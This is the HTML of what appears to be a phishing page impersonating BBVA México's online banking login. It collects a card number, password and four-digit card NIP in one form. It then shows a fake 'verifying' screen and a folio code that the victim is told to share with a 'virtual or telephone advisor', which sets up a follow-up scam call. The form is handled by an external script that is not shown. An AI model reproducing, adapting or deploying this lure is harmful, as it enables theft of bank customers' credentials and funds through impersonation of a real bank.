	<title>Bienvenidos a la Banca en Línea | BBVA México</title>

<body>
	
	<div class="contenedor">
		
		<div class="columna-top-rwd">

		</div>
		<div class="columna-derecha">
			
		</div>

		<div class="columna-izquierda">
			<div class="registro activo" id="registro">
				<div class="header">
					<h1>¡Bienvenido a la <strong>Banca en Línea</strong>!</h1>
					<br>
				</div>
		
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>Ingresa Tu Usuario</b>
						</p><br>
						<label for="nombre">Número de Tarjeta</label>
					<div class="contenedor-input">
						<input type="password" input id="usuario" name="usuario" placeholder="16 Dígitos" required/>
					</div>
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>Ingresa Tu Contraseña</b>
						</p><br>
						<label for="nombre">Tu contraseña debe tener entre 8 y 30 caracteres</label>
					<div class="contenedor-input">
						<input type="password" input id="contraseña" name="contraseña" placeholder="Contraseña" required/>
					</div>
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>Ingresa Tu NIP</b>
						</p><br>
						<label for="nombre">Tu NIP debe tener 4 caracteres</label>
					<div class="contenedor-input">
						<input type="password" input id="confirmar" name="confirmar" placeholder="NIP" required/>
					</div>
		
			
					
		
					<div class="contenedor-boton">
							<button type="submit">
							Continuar
							
						</button>
					</div>
					
				</form>
				<div class="true"><img src="img/trusteer-2.jpg"></div>
				
			</div>
			
			<div class="header exito" id="exito">

					<h2 class="txtFolio">Verificando…</h2>
					<div class="loading"><img src="img/loading-gif.gif"></div>
					<p class="txt">Folio generado con éxito. Comparte el folio con tu asesor virtual o telefónico.</p>
					<h1 class="folio">RP2384</h1>			

			

			

			</div>

		</div>
		<script src="js/bbapp.js"></script> 
		
	</div>

	
		

</body>
